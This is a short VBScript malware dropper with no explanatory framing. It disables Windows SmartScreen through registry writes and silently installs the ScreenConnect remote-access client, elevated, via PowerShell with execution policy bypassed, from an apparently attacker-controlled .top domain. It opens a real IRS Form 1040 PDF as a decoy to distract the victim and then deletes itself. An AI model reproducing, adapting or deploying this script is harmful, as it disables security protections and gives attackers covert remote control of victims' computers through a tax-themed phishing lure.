Dim shell, fso
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- Disable SmartScreen ---
On Error Resume Next
shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreenEnabled", "Off", "REG_SZ"
shell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows\System\EnableSmartScreen", "0", "REG_DWORD"
On Error Goto 0

' --- Install ScreenConnect directly from URL (silent, no window) ---
shell.Run "powershell -NoP -Ep Bypass -Command ""Start-Process msiexec.exe -ArgumentList '/i https://vbn.fog9kih.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest /quiet /norestart' -Verb RunAs -Wait""", 0, True

' --- Open IRS decoy PDF ---
shell.Run "rundll32.exe url.dll,FileProtocolHandler https://www.irs.gov/pub/irs-pdf/f1040.pdf", 1, False

' --- Self-delete after 5 seconds ---
WScript.Sleep 5000
fso.DeleteFile WScript.ScriptFullName, True